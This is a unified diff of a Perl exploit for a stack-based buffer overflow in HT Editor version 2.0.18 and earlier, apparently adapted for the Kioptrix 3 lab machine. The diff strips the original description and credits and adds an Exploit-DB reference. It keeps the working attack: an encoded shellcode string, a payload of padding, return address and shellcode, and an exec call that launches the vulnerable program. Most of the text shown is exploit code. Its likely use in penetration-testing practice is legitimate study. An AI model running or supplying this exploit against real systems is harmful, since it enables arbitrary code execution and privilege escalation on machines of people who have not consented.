@@ -1,39 +1,13 @@
-# Exploit Title: HT Editor File openning Stack Overflow (0day)
-# Date: March 30th 2011
-# Author: ZadYree Changed by Diego Albuquerque aka Tch4kra
-# Software Link: http://hte.sourceforge.net/downloads.html
+# Exploit Title: HT Editor File openning Stack Overflow 
+# Author: ZadYree changed by Diego Albuquerque aka Tch4kra
 # Version: <= 2.0.18
 # Tested on: Linux (kioptrix 3)
-# CVE : None
+
+# For original version - https://www.exploit-db.com/exploits/17083
+
+# Please change $namez if necessary!
+
 #!/usr/bin/perl
-=head1 TITLE
-
-HT Editor <=2.0.18 0day Stack-Based Overflow Exploit
-
-
-=head1 DESCRIPTION
-
-The vulnerability is triggered by a too large argument (+ path) which simply lets you overwrite eip.
-
-
-=head2 AUTHOR
-
-ZadYree ~ 3LRVS Team
-
-
-=head3 SEE ALSO
-
-ZadYree's blog: z4d.tuxfamily.org
-
-3LRVS blog: 3lrvs.tuxfamily.org
-
-Shellcodes based on
-http://www.shell-storm.org/shellcode/files/shellcode-606.php
-http://www.shell-storm.org/shellcode/files/shellcode-171.php
-
-=> Thanks 
-=cut
-
 
 my ($esp, $retaddr);
 my $scz = 	[	"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e" .
@@ -69,7 +43,6 @@ print '[+]$esp place found! (0x', $esp, ")\012Now exploiting...\n";
 my @payload = ($infos->[0], ("A" x ($infos->[1] - length(qx{pwd}))) . reverse(pack('H*', $infos->[3])) . reverse(pack('H*', $esp)) . $infos->[2]);
 exec(@payload);
 
-
 sub get_infos {
 	return([$namez->[0], 4108, $scz->[0], getendwin("linux")]);
 }
@@ -80,5 +53,4 @@ sub getendwin {
 		$retaddr = $1, last if ($_ =~ m{(.*) <});
 	}
 	return($retaddr);
-		
 }
